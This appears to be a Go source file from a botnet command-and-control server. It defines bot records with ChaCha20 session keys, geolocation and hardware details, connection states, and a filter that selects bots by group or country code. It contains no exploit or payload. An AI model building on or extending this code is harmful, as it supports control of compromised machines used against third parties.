package clients

import (
	"errors"
	"github.com/pariz/gountries"
	"golang.org/x/exp/slices"
	"net"
	"unsafe"
)

const (
	HeaderSize  = int(unsafe.Sizeof(Header{}))
	PingTimeout = 60
)

const (
	StateKeyExchange = iota
	StateVerifyExchange
	StateIdentification
	StateConnected
)

var (
	ErrHashMismatch   = errors.New("hash mismatch")
	ErrLengthMismatch = errors.New("length mismatch (data corrupted?)")
	ErrInvalidOpcode  = errors.New("invalid opcode")
	ErrInvalidSource  = errors.New("invalid client source")
	ErrNotReadable    = errors.New("data not readable")

	emptyKey  = make([]byte, 32)
	countries = gountries.New()
)

type Version struct {
	Major int8
	Minor int8
	Patch int8
}

type Information struct {
	// handled within the cnc
	Country     string
	CountryCode string
	ASN         string

	// sent from bot to cnc
	Version Version
	Address net.IP

	Name  string
	Cores int16 // there is no way this will ever go over 65535, right?
	Arch  int16
}

type Bot struct {
	Conn net.Conn

	// Bot Info
	ID    uint32
	State int

	// ChaCha20
	Key   []byte
	Nonce []byte

	Information
}

type Limitation struct {
	UUID    []string // uuids
	Group   []string // groups
	Country string   // the country lol
	Count   int      // count lol
	Admin   bool
}

func (c *Limitation) Compare(b *Bot) bool {
	if len(c.Group) > 0 && slices.Contains(c.Group, b.Name) && len(c.Country) > 0 && b.CountryCode == c.Country {
		return true
	}

	if len(c.Group) > 0 && slices.Contains(c.Group, b.Name) {
		return true
	}

	if len(c.Country) > 0 && b.CountryCode == c.Country {
		return true
	}

	return len(c.UUID) <= 0 && len(c.Group) <= 0
}
